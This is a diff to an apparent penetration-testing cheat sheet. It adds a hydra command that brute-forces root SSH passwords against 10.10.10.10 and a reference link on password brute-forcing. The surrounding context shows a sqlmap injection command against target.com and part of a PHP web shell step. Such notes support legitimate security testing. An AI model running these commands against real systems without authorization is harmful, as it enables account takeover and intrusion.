@@ -45,6 +45,11 @@
      		 
 		 append <?php ?> in the shell.php file
 		 
+# SSH
+	1. Bruteforcing password authentication enabled ssh service with hydra
+		hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
+		
+		 
 # Sqlmap
 
 	1. python sqlmap -u “https://target.com/index.php?name=abc" --batch
@@ -321,5 +326,4 @@ https://serverfault.com/questions/818058/get-remote-system-time-from-icmp-timest
 :References:
 
 http://sketchymoose.blogspot.in/2012/01/beginning-web-pen-testing-icmp-scans.html
-
-
+https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
